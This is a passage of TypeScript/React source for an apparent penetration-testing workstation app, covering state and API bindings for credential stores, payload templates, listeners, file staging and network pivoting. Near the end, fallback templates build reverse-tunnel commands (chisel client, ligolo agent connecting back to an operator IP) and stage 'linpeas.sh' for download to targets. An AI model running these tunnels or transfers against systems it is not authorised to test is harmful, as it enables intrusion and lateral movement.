  SaveCredential?: (c: CredentialEntry) => Promise<void>;
  ListCredentials?: (engagementId: string, hostId: string) => Promise<CredentialEntry[]>;
  SaveEvidence?: (item: EvidenceItem) => Promise<void>;
  ListEvidence?: (engagementId: string, hostId: string) => Promise<EvidenceItem[]>;
  SaveFinding?: (item: FindingItem) => Promise<void>;
  ListFindings?: (engagementId: string, hostId: string) => Promise<FindingItem[]>;
  GetFinding?: (id: string) => Promise<FindingItem>;
  DeleteFinding?: (id: string) => Promise<void>;
  GetFindingTemplates?: () => Promise<FindingItem[]>;
  ScanNmapXML?: (xmlContent: string) => Promise<NmapScanResult>;
  ImportNmapXML?: (req: NmapImportRequest) => Promise<NmapImportSummary>;
  GetPayloadTemplatesConfig?: () => Promise<PayloadFileConfig>;
  SetPayloadTemplatesPath?: (customPath: string) => Promise<PayloadFileConfig>;
  ListPayloadTemplates?: () => Promise<PayloadTemplate[]>;
  SavePayloadTemplate?: (tmpl: PayloadTemplate) => Promise<void>;
  DeletePayloadTemplate?: (templateId: string) => Promise<void>;
  RenderPayload?: (opts: PayloadRenderOptions) => Promise<PayloadRenderResult>;
  SavePayloadAsSnippet?: (opts: PayloadRenderOptions, snippetName: string) => Promise<Snippet>;
  SelectFileDialog?: (title: string, filterName: string, filterPattern: string) => Promise<string>;
  SelectDirectoryDialog?: (title: string) => Promise<string>;
  GetSnippetChainsConfig?: () => Promise<SnippetChainsFileConfig>;
  SetSnippetChainsPath?: (customPath: string) => Promise<SnippetChainsFileConfig>;
  ListSnippetChainsFromFile?: () => Promise<SnippetChain[]>;
  SaveSnippetChainToFile?: (chain: SnippetChain) => Promise<void>;
  DeleteSnippetChainFromFile?: (chainId: string) => Promise<void>;
  GetSnippetsConfig?: () => Promise<SnippetsFileConfig>;
  SetSnippetsPath?: (customPath: string) => Promise<SnippetsFileConfig>;
  ListSnippetsFromFile?: () => Promise<Snippet[]>;
  SaveSnippetToFile?: (snippet: Snippet) => Promise<void>;
  DeleteSnippetFromFile?: (snippetId: string) => Promise<void>;
  ListListenerProfiles?: () => Promise<ListenerProfile[]>;
  SaveListenerProfile?: (prof: ListenerProfile) => Promise<void>;
  DeleteListenerProfile?: (profileId: string) => Promise<void>;
  StartManagedListener?: (prof: ListenerProfile) => Promise<ManagedListenerInfo>;
  StopManagedListener?: (listenerId: string) => Promise<void>;
  ListActiveManagedListeners?: () => Promise<ManagedListenerInfo[]>;
  GenerateListenerCommand?: (prof: ListenerProfile) => Promise<string>;
  GetDefaultStagingDirectory?: () => Promise<string>;
  GetLocalNetworkIPs?: () => Promise<NetworkInterfaceIP[]>;
  ListFileTransferServers?: () => Promise<FileTransferServerInfo[]>;
  StartFileTransferServer?: (cfg: FileTransferServerConfig) => Promise<FileTransferServerInfo>;
  StopFileTransferServer?: (serverId: string) => Promise<void>;
  GenerateFileServerCommand?: (cfg: FileTransferServerConfig) => Promise<string>;
  ListHostedTransferFiles?: (dir: string) => Promise<HostedFileEntry[]>;
  HashHostedTransferFile?: (rootDir: string, relPath: string) => Promise<HostedFileEntry>;
  GenerateFileTransferCommands?: (opts: FileTransferCommandOptions) => Promise<FileTransferCommandSet>;
  GetDefaultNetworkRoutes?: () => Promise<NetworkRoute[]>;
  ListNetworkRoutes?: () => Promise<NetworkRoute[]>;
  SaveNetworkRoute?: (route: NetworkRoute) => Promise<void>;
  DeleteNetworkRoute?: (routeId: string) => Promise<void>;
  DetectPivotBinaries?: () => Promise<PivotBinaryStatus[]>;
  StartPivotInstance?: (route: NetworkRoute) => Promise<PivotInstanceInfo>;
  StopPivotInstance?: (instanceId: string) => Promise<void>;
  SendPivotInput?: (instanceId: string, input: string) => Promise<void>;
  ListActivePivotInstances?: () => Promise<PivotInstanceInfo[]>;
  BuildPivotCommands?: (route: NetworkRoute, lhost: string) => Promise<PivotCommandSet>;
  LaunchTwoStepSshPivot?: (req: TwoStepSshPivotRequest) => Promise<ForwardTunnelStatus>;
  RunRouteHealthCheck?: (req: RouteCheckRequest) => Promise<RouteHealthReport>;
  ParseRouteProbeTargets?: (raw: string) => Promise<string[]>;
  ListWinrmProfileSummaries?: () => Promise<WinrmProfileSummary[]>;
  SaveWinrmProfile?: (profile: WinrmProfilePayload) => Promise<void>;
  DeleteWinrmProfile?: (id: string) => Promise<void>;
  DetectWinrmTools?: () => Promise<WinrmToolStatus[]>;
  BuildWinrmCLICommand?: (profile: WinrmProfilePayload) => Promise<string>;
  ConnectWinrmSession?: (req: WinrmConnectRequest) => Promise<WinrmSessionInfo>;
  ListActiveWinrmSessions?: () => Promise<WinrmSessionInfo[]>;
  ExecuteWinrmCommand?: (sessionId: string, script: string) => Promise<WinrmExecResult>;
  UploadWinrmFile?: (sessionId: string, localPath: string, remotePath: string) => Promise<WinrmTransferResult>;
  DownloadWinrmFile?: (sessionId: string, remotePath: string, localPath: string) => Promise<WinrmTransferResult>;
}

export interface SerialAutoDetectResult {
  port: string;
  baudRate: number;
  confidence: string;
  detected: boolean;
  message: string;
}

export interface SerialConfig {
  port: string;
  baudRate: number;
  dataBits: number;
  parity: 'none' | 'odd' | 'even' | 'mark' | 'space';
  stopBits: '1' | '1.5' | '2';
  flowControl: 'none' | 'hardware' | 'software';
  dtr: boolean;
  rts: boolean;
  localEcho: boolean;
  lineEnding: string;
}

export interface SerialPortInfo {
  port: string;
  description: string;
  manufacturer?: string;
  hardwareId?: string;
  deviceType?: string;
  isUsb?: boolean;
  isConnected?: boolean;
}

export type SidebarPanel = 'hosts' | 'snippets' | 'chains' | 'payloads' | 'pivot' | 'forwards' | 'transfer' | 'listeners' | 'notes' | 'totp' | 'credentials';
export type NavDropdownMenu = 'view' | 'engagement-selector' | 'engagement-tools' | 'terminals' | 'offense' | 'networking' | 'intel';

interface WailsRuntime {
  EventsOn: (eventName: string, callback: (data: unknown) => void) => () => void;
}

function getWailsBindings(): WailsAppBindings | undefined {
  const win = window as unknown as {
    go?: { main?: { App?: WailsAppBindings } };
  };
  return win.go?.main?.App;
}

function getWailsRuntime(): WailsRuntime | undefined {
  const win = window as unknown as {
    runtime?: WailsRuntime;
  };
  return win.runtime;
}

function sanitizeNodeForPersistence(n: WorkspaceNode): PersistedWorkspaceNode {
  if (n.type === 'pane') {
    return {
      type: 'pane',
      id: n.id,
      sessionId: n.sessionId,
      hostId: n.hostId,
      title: n.title,
      cwd: n.cwd,
      paneType: n.paneType,
      notesHostId: n.notesHostId,
      sftpSessionId: n.sftpSessionId,
    };
  }
  return {
    type: 'split',
    id: n.id,
    direction: n.direction,
    children: (n.children || []).map(sanitizeNodeForPersistence),
    ratios: n.ratios,
  };
}

function sanitizeTabForPersistence(t: TabItem): PersistedTabItem {
  return {
    id: t.id,
    title: t.title,
    hostId: t.hostId,
    color: t.color,
    splitDir: 'none',
    activePaneId: t.activePaneId,
    tabType: t.tabType,
    notesHostId: t.notesHostId,
    rootNode: sanitizeNodeForPersistence(t.rootNode),
  };
}

export function App({
  initialLocked = false,
  initialSettings,
}: {
  initialLocked?: boolean;
  initialSettings?: Partial<AppGlobalSettings>;
} = {}): React.JSX.Element {
  const [vaultLocked, setVaultLocked] = useState<boolean>(initialLocked);
  const [vaultInitialized, setVaultInitialized] = useState<boolean>(!initialLocked);
  const [passwordless, setPasswordless] = useState<boolean>(!initialLocked);
  const [quickUnlockReady, setQuickUnlockReady] = useState<boolean>(false);
  const [helloPending, setHelloPending] = useState<boolean>(false);
  const [modalError, setModalError] = useState<string>('');

  const [sidebarCollapsed, setSidebarCollapsed] = useState<boolean>(false);
  const [sidebarWidth, setSidebarWidth] = useState<number>(() => {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        const saved = window.localStorage.getItem('doubleagent_sidebar_width');
        const parsed = saved ? parseInt(saved, 10) : 280;
        return Number.isFinite(parsed) && parsed >= 180 && parsed <= 650 ? parsed : 280;
      }
    } catch {
      // ignore in environments without localStorage
    }
    return 280;
  });
  const [isResizingSidebar, setIsResizingSidebar] = useState<boolean>(false);
  const [activeSidebarPanel, setActiveSidebarPanel] = useState<SidebarPanel>('hosts');
  const [snippetDrawerQuery, setSnippetDrawerQuery] = useState<string>('');
  const [snippetDrawerOs, setSnippetDrawerOs] = useState<'all' | 'linux' | 'windows'>('all');
  const [snippetDrawerTag, setSnippetDrawerTag] = useState<string>('all');
  const [chainDrawerQuery, setChainDrawerQuery] = useState<string>('');
  const [chainDrawerTag, setChainDrawerTag] = useState<string>('all');
  const [forwardsDrawerQuery, setForwardsDrawerQuery] = useState<string>('');
  const [credDrawerQuery, setCredDrawerQuery] = useState<string>('');
  const [credDrawerScope, setCredDrawerScope] = useState<'host_and_engagement' | 'all'>('host_and_engagement');
  const [totpDrawerScope, setTotpDrawerScope] = useState<'host_and_global' | 'all'>('host_and_global');
  const [drawerTotpCodes, setDrawerTotpCodes] = useState<Record<string, TotpCodeResponse>>({});
  const [scratchpadContent, setScratchpadContent] = useState<string>(() => {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        return window.localStorage.getItem('doubleagent_scratchpad') || '';
      }
    } catch {
      // ignore storage availability errors
    }
    return '';
  });
  const [drawerListeners, setDrawerListeners] = useState<ManagedListenerInfo[]>([]);
  const [drawerCreds, setDrawerCreds] = useState<CredentialEntry[]>([]);
  const [drawerPivots, setDrawerPivots] = useState<PivotInstanceInfo[]>([]);
  const [sidebarPivotTool, setSidebarPivotTool] = useState<PivotTool>('ligolo-ng');
  const [sidebarPivotPort, setSidebarPivotPort] = useState<number>(11601);
  const [sidebarPivotSubnets, setSidebarPivotSubnets] = useState<string>('10.10.20.0/24');
  const [sidebarPivotLhost, setSidebarPivotLhost] = useState<string>('10.10.14.1');
  const [sidebarPivotLocalIPs, setSidebarPivotLocalIPs] = useState<NetworkInterfaceIP[]>([]);
  const [sidebarPivotSshTarget, setSidebarPivotSshTarget] = useState<string>('user@10.10.20.5');
  const [sidebarPivotRelayHostId, setSidebarPivotRelayHostId] = useState<string>('');
  const [sidebarPivotForwardMode, setSidebarPivotForwardMode] = useState<'local' | 'socks'>('local');
  const [sidebarPivotForwardTarget, setSidebarPivotForwardTarget] = useState<string>('10.10.20.10:3389');
  const [sidebarPivotCommands, setSidebarPivotCommands] = useState<PivotCommandSet | null>(null);
  const [sidebarPivotBusy, setSidebarPivotBusy] = useState<boolean>(false);
  const [sidebarPivotTargetOs, setSidebarPivotTargetOs] = useState<'linux' | 'windows'>('linux');

  // File Transfer Helper sidebar drawer state (launch, monitor, browse files & folders)
  const [sidebarTransferDir, setSidebarTransferDir] = useState<string>('');
  const [sidebarTransferKind, setSidebarTransferKind] = useState<FileServerKind>('builtin');
  const [sidebarTransferBind, setSidebarTransferBind] = useState<string>('0.0.0.0');
  const [sidebarTransferPort, setSidebarTransferPort] = useState<number>(8000);
  const [sidebarTransferUpload, setSidebarTransferUpload] = useState<boolean>(true);
  const [sidebarTransferFiles, setSidebarTransferFiles] = useState<HostedFileEntry[]>([]);
  const [sidebarTransferLoadingFiles, setSidebarTransferLoadingFiles] = useState<boolean>(false);
  const [sidebarTransferSelectedFile, setSidebarTransferSelectedFile] = useState<string>('linpeas.sh');
  const [sidebarTransferSelectedHashes, setSidebarTransferSelectedHashes] = useState<{
    filename: string;
    sha256: string;
    md5: string;
    size?: number;
  } | null>(null);
  const [sidebarTransferLhost, setSidebarTransferLhost] = useState<string>('10.10.14.1');
  const [sidebarTransferLocalIPs, setSidebarTransferLocalIPs] = useState<NetworkInterfaceIP[]>([]);
  const [sidebarTransferTargetOs, setSidebarTransferTargetOs] = useState<'linux' | 'windows'>('linux');
  const [sidebarTransferTool, setSidebarTransferTool] = useState<'curl' | 'wget' | 'memory'>('curl');
  const [sidebarTransferDestDir, setSidebarTransferDestDir] = useState<string>('.');
  const [sidebarTransferCmdSet, setSidebarTransferCmdSet] = useState<FileTransferCommandSet | null>(null);
  const [sidebarTransferExtCmd, setSidebarTransferExtCmd] = useState<string>('');
  const [sidebarTransferBusy, setSidebarTransferBusy] = useState<boolean>(false);
  const [sidebarTransferError, setSidebarTransferError] = useState<string>('');

  const handleSidebarResizeStart = useCallback((e: React.MouseEvent) => {
    e.preventDefault();
    setIsResizingSidebar(true);
    const startX = e.clientX;
    const startWidth = sidebarWidth;

    const handleMouseMove = (moveEvent: MouseEvent) => {
      const delta = moveEvent.clientX - startX;
      const newWidth = Math.min(650, Math.max(180, startWidth + delta));
      setSidebarWidth(newWidth);
    };

    const handleMouseUp = (upEvent: MouseEvent) => {
      const delta = upEvent.clientX - startX;
      const finalWidth = Math.min(650, Math.max(180, startWidth + delta));
      setSidebarWidth(finalWidth);
      setIsResizingSidebar(false);
      try {
        if (typeof window !== 'undefined' && window.localStorage) {
          window.localStorage.setItem('doubleagent_sidebar_width', finalWidth.toString());
        }
      } catch {
        // ignore
      }
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
    };

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('mouseup', handleMouseUp);
  }, [sidebarWidth]);

  useEffect(() => {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        window.localStorage.setItem('doubleagent_scratchpad', scratchpadContent);
      }
    } catch {
      // ignore storage quota errors
    }
  }, [scratchpadContent]);

  useEffect(() => {
    if (activeSidebarPanel === 'payloads') {
      const api = getWailsBindings();
      if (api?.ListPayloadTemplates) {
        void api.ListPayloadTemplates().then((list) => {
          const items = list || [];
          setSidebarPayloads(items);
          setSidebarSelectedPayloadId((prev) => {
            if (prev && items.some((t) => t.id === prev)) return prev;
            return items[0]?.id || '';
          });
        }).catch(() => { });
      }
      if (api?.GetLocalNetworkIPs) {
        void api.GetLocalNetworkIPs().then((ips) => {
          if (ips && ips.length > 0) {
            setSidebarPayloadLocalIPs(ips);
            const vpn = ips.find((i) => i.isVpn) || ips[0];
            setSidebarPayloadLhost((curr) => (curr === '10.10.14.1' ? vpn.ip : curr));
          }
        }).catch(() => { });
      }
    }
    if (activeSidebarPanel === 'listeners') {
      const api = getWailsBindings();
      if (api?.ListActiveManagedListeners) {
        void api.ListActiveManagedListeners().then((list) => {
          if (list) setDrawerListeners(list);
        }).catch(() => { });
      }
    }
    if (activeSidebarPanel === 'forwards') {
      const api = getWailsBindings();
      if (api?.ListForwardRules) {
        void api.ListForwardRules().then((rules) => {
          if (rules) setForwardRules([...rules]);
        }).catch(() => { });
      }
      if (api?.GetActiveTunnels) {
        void api.GetActiveTunnels().then((tunnels) => {
          if (tunnels) setActiveTunnels([...tunnels]);
        }).catch(() => { });
      }
    }
    if (activeSidebarPanel === 'pivot') {
      const api = getWailsBindings();
      if (api?.ListActivePivotInstances) {
        void api.ListActivePivotInstances().then((list) => {
          if (list) setDrawerPivots(list);
        }).catch(() => { });
      }
      if (api?.GetLocalNetworkIPs) {
        void api.GetLocalNetworkIPs().then((ips) => {
          if (ips && ips.length > 0) {
            setSidebarPivotLocalIPs(ips);
            const vpn = ips.find((i) => i.isVpn) || ips[0];
            setSidebarPivotLhost((curr) => (curr === '10.10.14.1' ? vpn.ip : curr));
          }
        }).catch(() => { });
      }
    }
    if (activeSidebarPanel === 'transfer') {
      const api = getWailsBindings();
      if (api?.ListFileTransferServers) {
        void api.ListFileTransferServers().then((s) => {
          if (s) setDashboardFileServers(s);
        }).catch(() => { });
      }
      if (api?.GetLocalNetworkIPs) {
        void api.GetLocalNetworkIPs().then((ips) => {
          if (ips && ips.length > 0) {
            setSidebarTransferLocalIPs(ips);
            const vpn = ips.find((i) => i.isVpn) || ips[0];
            setSidebarTransferLhost((curr) => (curr === '10.10.14.1' ? vpn.ip : curr));
          }
        }).catch(() => { });
      }
      if (!sidebarTransferDir && api?.GetDefaultStagingDirectory) {
        void api.GetDefaultStagingDirectory().then((defDir) => {
          const clean = (defDir || '.').trim();
          setSidebarTransferDir((prev) => prev || clean);
          if (clean && api.ListHostedTransferFiles) {
            setSidebarTransferLoadingFiles(true);
            void api.ListHostedTransferFiles(clean)
              .then((files) => setSidebarTransferFiles(files || []))
              .catch(() => setSidebarTransferFiles([]))
              .finally(() => setSidebarTransferLoadingFiles(false));
          }
        }).catch(() => { });
      } else if (sidebarTransferDir && api?.ListHostedTransferFiles) {
        setSidebarTransferLoadingFiles(true);
        void api.ListHostedTransferFiles(sidebarTransferDir)
          .then((files) => setSidebarTransferFiles(files || []))
          .catch(() => { })
          .finally(() => setSidebarTransferLoadingFiles(false));
      }
    }
  }, [activeSidebarPanel, sidebarTransferDir]);

  useEffect(() => {
    if (activeSidebarPanel !== 'transfer') return;
    const api = getWailsBindings();
    const timer = window.setInterval(() => {
      if (api?.ListFileTransferServers) {
        void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => { });
      }
    }, 2200);
    return () => window.clearInterval(timer);
  }, [activeSidebarPanel]);

  useEffect(() => {
    if (activeSidebarPanel !== 'transfer') return;
    const api = getWailsBindings();
    const matchedHash =
      sidebarTransferSelectedHashes && sidebarTransferSelectedHashes.filename === sidebarTransferSelectedFile
        ? sidebarTransferSelectedHashes
        : null;
    if (api?.GenerateFileTransferCommands) {
      let active = true;
      void api.GenerateFileTransferCommands({
        filename: sidebarTransferSelectedFile.trim() || 'linpeas.sh',
        localIp: sidebarTransferLhost.trim() || '10.10.14.1',
        port: Number(sidebarTransferPort) || 8000,
        useTLS: false,
        targetOs: sidebarTransferTargetOs,
        targetDestDir: sidebarTransferDestDir,
        enableUpload: sidebarTransferUpload,
        sha256: matchedHash?.sha256,
        md5: matchedHash?.md5,
      }).then((res) => {
        if (active && res) setSidebarTransferCmdSet(res);
      }).catch(() => { });
      return () => { active = false; };
    }
  }, [
    activeSidebarPanel,
    sidebarTransferSelectedFile,
    sidebarTransferSelectedHashes,
    sidebarTransferLhost,
    sidebarTransferPort,
    sidebarTransferTargetOs,
    sidebarTransferDestDir,
    sidebarTransferUpload,
  ]);

  useEffect(() => {
    if (activeSidebarPanel !== 'transfer') return;
    const api = getWailsBindings();
    if (api?.GenerateFileServerCommand) {
      let active = true;
      void api.GenerateFileServerCommand({
        id: '',
        name: `Staging ${sidebarTransferKind}`,
        kind: sidebarTransferKind,
        directory: sidebarTransferDir || '.',
        bindAddress: sidebarTransferBind || '0.0.0.0',
        port: Number(sidebarTransferPort) || 8000,
        enableUpload: sidebarTransferUpload,
        useTLS: false,
      }).then((cmd) => {
        if (active && cmd) setSidebarTransferExtCmd(cmd);
      }).catch(() => { });
      return () => { active = false; };
    }
  }, [
    activeSidebarPanel,
    sidebarTransferKind,
    sidebarTransferDir,
    sidebarTransferBind,
    sidebarTransferPort,
    sidebarTransferUpload,
  ]);

  useEffect(() => {
    if (activeSidebarPanel !== 'totp') return;
    let active = true;
    const pollTotp = async () => {
      const api = getWailsBindings();
      if (api?.ListTotpRecords) {
        try {
          const list = await api.ListTotpRecords();
          if (active && Array.isArray(list)) {
            setTotpTokensList(list);
          }
        } catch {
          // ignore transient poll error
        }
      }
      if (api?.GetAllTotpCodes) {
        try {
          const res = await api.GetAllTotpCodes();
          if (active && Array.isArray(res)) {
            const map: Record<string, TotpCodeResponse> = {};
            for (const c of res) {
              map[c.id] = c;
            }
            setDrawerTotpCodes(map);
          }
        } catch {
          // ignore transient poll error
        }
      }
    };
    void pollTotp();
    const interval = window.setInterval(() => void pollTotp(), 1000);
    return () => {
      active = false;
      window.clearInterval(interval);
    };
  }, [activeSidebarPanel]);

  const [serialDetecting, setSerialDetecting] = useState<boolean>(false);
  const [serialDetectResult, setSerialDetectResult] = useState<SerialAutoDetectResult | null>(null);
  const [activeSignalAnalyzers, setActiveSignalAnalyzers] = useState<Set<string>>(new Set());
  const lastRxDataRef = useRef<Map<string, string>>(new Map());
  const lastTxDataRef = useRef<Map<string, string>>(new Map());
  const [, setRxDataTicks] = useState<number>(0);
  const menuCloseTimerRef = useRef<number | null>(null);

  const handleMenuEnter = (menu: NavDropdownMenu): void => {
    if (menuCloseTimerRef.current !== null) {
      window.clearTimeout(menuCloseTimerRef.current);
      menuCloseTimerRef.current = null;
    }
    setActiveDropdownMenu(menu);
  };

  const handleMenuMove = (): void => {
    if (menuCloseTimerRef.current !== null) {
      window.clearTimeout(menuCloseTimerRef.current);
      menuCloseTimerRef.current = null;
    }
  };

  const handleMenuLeave = (): void => {
    if (menuCloseTimerRef.current !== null) {
      window.clearTimeout(menuCloseTimerRef.current);
    }
    menuCloseTimerRef.current = window.setTimeout(() => {
      setActiveDropdownMenu(null);
      menuCloseTimerRef.current = null;
    }, 400);
  };

  const [showVaultModal, setShowVaultModal] = useState<boolean>(false);
  const [showSettingsModal, setShowSettingsModal] = useState<boolean>(false);
  const [showAddHostModal, setShowAddHostModal] = useState<boolean>(false);
  const [showKeychainModal, setShowKeychainModal] = useState<boolean>(false);
  const [showSSHConfigModal, setShowSSHConfigModal] = useState<boolean>(false);
  const [showCommandPalette, setShowCommandPalette] = useState<boolean>(false);
  const [paletteQuery, setPaletteQuery] = useState<string>('');
  const [palettePassword, setPalettePassword] = useState<string>('');
  const [paletteResponse, setPaletteResponse] = useState<CommandPaletteResponse>({
    query: '',
    hostResults: [],
  });

  const [masterPassword, setMasterPassword] = useState<string>('');
  const [confirmPassword, setConfirmPassword] = useState<string>('');
  const [currentPassword, setCurrentPassword] = useState<string>('');
  const [newPassword, setNewPassword] = useState<string>('');

  // Vault Hosts, Groups & Keys state (F-01, F-04)
  const [vaultSummary, setVaultSummary] = useState<VaultSummary>({
    groups: [],
    hosts: [],
    identities: [],
    keys: [],
    proxyProfiles: [],
    snippets: [],
  });
  const [searchQuery, setSearchQuery] = useState<string>('');

  // Keychain form state (F-04)
  const [keyLabel, setKeyLabel] = useState<string>('');
  const [keyType, setKeyType] = useState<string>('ed25519');
  const [keyPassphrase, setKeyPassphrase] = useState<string>('');
  const [importKeyRaw, setImportKeyRaw] = useState<string>('');

  // ssh_config Import state (F-22)
  const [sshConfigText, setSshConfigText] = useState<string>('');
  const [sshConfigResult, setSshConfigResult] = useState<SSHConfigParseResult | null>(null);

  // PuTTY & Termius Import state (F-30)
  const [showImportModal, setShowImportModal] = useState<boolean>(false);

  // Raw TCP Socket & Listener state (F-31)
  const [showRawTcpModal, setShowRawTcpModal] = useState<boolean>(false);
  const [rawTcpListeners, setRawTcpListeners] = useState<RawTcpListenerInfo[]>([]);

  // Pentest Credential Pool & Spray Generator state (F-36, F-40)
  const [showCredStoreModal, setShowCredStoreModal] = useState<boolean>(false);
  // Pentest Evidence Vault state (F-18)
  const [showEvidenceModal, setShowEvidenceModal] = useState<boolean>(false);
  // Nmap XML Recon Ingest state (F-39)
  const [showNmapImportModal, setShowNmapImportModal] = useState<boolean>(false);
  // Payload Generator state (F-33)
  const [showPayloadGeneratorModal, setShowPayloadGeneratorModal] = useState<boolean>(false);
  const [sidebarPayloads, setSidebarPayloads] = useState<PayloadTemplate[]>([]);
  const [sidebarPayloadQuery, setSidebarPayloadQuery] = useState<string>('');
  const [sidebarPayloadOs, setSidebarPayloadOs] = useState<'all' | 'linux' | 'windows'>('all');
  const [sidebarPayloadLhost, setSidebarPayloadLhost] = useState<string>('10.10.14.1');
  const [sidebarPayloadLport, setSidebarPayloadLport] = useState<number>(443);
  const [apiTesterDraft, setApiTesterDraft] = useState<ApiRequestItem | null>(null);
  const [sidebarPayloadEncoding, setSidebarPayloadEncoding] = useState<PayloadEncoding>('none');
  const [sidebarPayloadLocalIPs, setSidebarPayloadLocalIPs] = useState<NetworkInterfaceIP[]>([]);
  const [sidebarSelectedPayloadId, setSidebarSelectedPayloadId] = useState<string>('');
  const [sidebarPayloadPreview, setSidebarPayloadPreview] = useState<PayloadRenderResult | null>(null);
  // Listener Manager state (F-32)
  const [showListenerManagerModal, setShowListenerManagerModal] = useState<boolean>(false);
  // File Transfer Helper state (F-31)
  const [showFileTransferModal, setShowFileTransferModal] = useState<boolean>(false);
  // Network Pivoting Manager state (F-24)
  const [showPivotManagerModal, setShowPivotManagerModal] = useState<boolean>(false);
  // Remote Listening Sockets HUD state (F-45)
  const [showRemoteSocketsModal, setShowRemoteSocketsModal] = useState<boolean>(false);
  // Route Health Check Dashboard state (opened as workspace view tab)
  const [dashboardFileServers, setDashboardFileServers] = useState<FileTransferServerInfo[]>([]);

  const refreshRouteHealthEndpoints = useCallback(() => {
    const api = getWailsBindings();
    if (api?.ListActiveManagedListeners) {
      void api.ListActiveManagedListeners().then((l) => setDrawerListeners(l || [])).catch(() => { });
    }
    if (api?.ListActivePivotInstances) {
      void api.ListActivePivotInstances().then((p) => setDrawerPivots(p || [])).catch(() => { });
    }
    if (api?.ListFileTransferServers) {
      void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => { });
    }
    if (api?.GetActiveTunnels) {
      void api.GetActiveTunnels().then((t) => setActiveTunnels(t || [])).catch(() => { });
    }
  }, []);
  // WinRM / PowerShell Remoting Client state (F-41)
  const [showWinrmModal, setShowWinrmModal] = useState<boolean>(false);
  // Pentest Engagement Hub state (F-36)
  const [showEngagementHubModal, setShowEngagementHubModal] = useState<boolean>(false);
  const [activeEngagement, setActiveEngagement] = useState<Engagement | null>(null);
  const [engagementsList, setEngagementsList] = useState<Engagement[]>([]);
  const [showNewEngagementModal, setShowNewEngagementModal] = useState<boolean>(false);
  const [editingEngagement, setEditingEngagement] = useState<Engagement | null>(null);
  const [filterByEngagementScope, setFilterByEngagementScope] = useState<boolean>(true);

  useEffect(() => {
    if (activeSidebarPanel === 'credentials' || showWinrmModal) {
      const api = getWailsBindings();
      if (api?.ListCredentials) {
        void api.ListCredentials(activeEngagement?.id || '', '').then((list) => {
          if (list) setDrawerCreds(list);
        }).catch(() => { });
      }
    }
  }, [activeSidebarPanel, activeEngagement, showWinrmModal]);

  useEffect(() => {
    if (activeSidebarPanel !== 'pivot') return;
    const api = getWailsBindings();
    const subs = sidebarPivotSubnets.split(/[\s,;]+/).map((s) => s.trim()).filter(Boolean);
    const route: NetworkRoute = {
      id: '',
      engagementId: activeEngagement?.id || '',
      name: `Sidebar ${sidebarPivotTool}`,
      kind: sidebarPivotTool === 'ligolo-ng' ? 'ligolo' : sidebarPivotTool,
      tool: sidebarPivotTool,
      bindAddress: sidebarPivotTool === 'ssh-forward' ? '127.0.0.1' : '0.0.0.0',
      listenPort: sidebarPivotTool === 'sshuttle' ? 0 : Number(sidebarPivotPort) || (sidebarPivotTool === 'chisel' ? 8443 : sidebarPivotTool === 'ssh-forward' ? 13389 : 11601),
      socksPort: sidebarPivotForwardMode === 'socks' ? Number(sidebarPivotPort) || 1080 : 1080,
      interfaceName: 'ligolo',
      subnets: subs,
      reverse: true,
      selfCert: true,
      ignoreCert: true,
      sshTarget: sidebarPivotSshTarget.trim() || undefined,
      relayHostId: sidebarPivotRelayHostId || undefined,
      forwardMode: sidebarPivotForwardMode,
      forwardTarget: sidebarPivotForwardTarget.trim() || undefined,
    };
    if (api?.BuildPivotCommands) {
      let active = true;
      void api.BuildPivotCommands(route, sidebarPivotLhost.trim() || '10.10.14.1').then((res) => {
        if (active && res) setSidebarPivotCommands(res);
      }).catch(() => { });
      return () => { active = false; };
    }
    const targetSub = subs[0] || '10.10.20.0/24';
    const fallbackLhost = sidebarPivotLhost.trim() || '10.10.14.1';
    if (sidebarPivotTool === 'sshuttle') {
      const jt = sidebarPivotSshTarget.trim() || 'user@10.10.20.5';
      setSidebarPivotCommands({
        tool: 'sshuttle',
        lhost: fallbackLhost,
        proxyCommand: `sshuttle -r ${jt} ${subs.join(' ') || targetSub}`,
        linuxAgentCmd: `sshuttle -r ${jt} ${subs.join(' ') || targetSub} --dns`,
        windowsAgentCmd: `wsl sshuttle -r ${jt} ${subs.join(' ') || targetSub} --dns`,
      });
    } else if (sidebarPivotTool === 'ssh-forward') {
      const jt = sidebarPivotSshTarget.trim() || 'user@relay-host';
      const lp = Number(sidebarPivotPort) || 13389;
      const ft = sidebarPivotForwardTarget.trim() || '10.10.20.10:3389';
      const cmd = sidebarPivotForwardMode === 'socks'
        ? `ssh -N -D 127.0.0.1:${lp} ${jt}`
        : `ssh -N -L 127.0.0.1:${lp}:${ft} ${jt}`;
      setSidebarPivotCommands({
        tool: 'ssh-forward',
        lhost: fallbackLhost,
        proxyCommand: cmd,
        linuxAgentCmd: cmd,
        windowsAgentCmd: cmd,
        proxychainsLine: sidebarPivotForwardMode === 'socks' ? `socks5 127.0.0.1 ${lp}` : undefined,
      });
    } else if (sidebarPivotTool === 'chisel') {
      setSidebarPivotCommands({
        tool: 'chisel',
        lhost: fallbackLhost,
        proxyCommand: `chisel server --host 0.0.0.0 -p ${sidebarPivotPort} --reverse --socks5`,
        linuxAgentCmd: `./chisel client ${fallbackLhost}:${sidebarPivotPort} R:socks`,
        windowsAgentCmd: `.\\chisel.exe client ${fallbackLhost}:${sidebarPivotPort} R:socks`,
        proxychainsLine: 'socks5 127.0.0.1 1080',
      });
    } else {
      setSidebarPivotCommands({
        tool: 'ligolo-ng',
        lhost: fallbackLhost,
        proxyCommand: `ligolo-proxy -laddr 0.0.0.0:${sidebarPivotPort} -selfcert`,
        linuxAgentCmd: `./agent -connect ${fallbackLhost}:${sidebarPivotPort} -ignore-cert`,
        windowsAgentCmd: `.\\agent.exe -connect ${fallbackLhost}:${sidebarPivotPort} -ignore-cert`,
      });
    }
  }, [
    activeSidebarPanel,
    activeEngagement?.id,
    sidebarPivotTool,
    sidebarPivotPort,
    sidebarPivotSubnets,
    sidebarPivotLhost,
    sidebarPivotSshTarget,
    sidebarPivotRelayHostId,
    sidebarPivotForwardMode,
    sidebarPivotForwardTarget,
  ]);

  // Terminal Selection Context Menu & Quick Save State (F-19)
  const [terminalContextMenu, setTerminalContextMenu] = useState<{
    x: number;
    y: number;
    sessionId: string;
    selectedText: string;
    hostId?: string;
